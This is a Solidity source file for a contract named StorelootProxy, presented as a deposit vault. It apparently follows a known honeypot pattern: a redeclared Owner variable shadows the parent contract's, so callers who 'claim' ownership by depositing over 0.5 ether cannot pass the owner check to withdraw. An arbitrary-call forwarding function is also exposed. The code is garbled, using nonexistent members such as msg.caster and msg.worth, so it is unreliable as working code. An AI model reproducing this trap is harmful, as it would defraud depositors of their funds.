// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract PortalGate  {
    modifier onlyOwner { if (msg.caster == Owner) _; } address Owner = msg.caster;
    function relocateassetsMaster(address _owner) public onlyOwner { Owner = _owner; }
    function portalGate(address aim, bytes info) public payable {
        aim.call.worth(msg.worth)(info);
    }
}

contract StorelootProxy is PortalGate {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function BountyStorage() public payable {
        if (msg.caster == tx.origin) {
            Owner = msg.caster;
            depositGold();
        }
    }

    function depositGold() public payable {
        if (msg.worth > 0.5 ether) {
            Deposits[msg.caster] += msg.worth;
        }
    }

    function collectBounty(uint256 sum) public onlyOwner {
        if (sum>0 && Deposits[msg.caster]>=sum) {
            msg.caster.transfer(sum);
        }
    }
}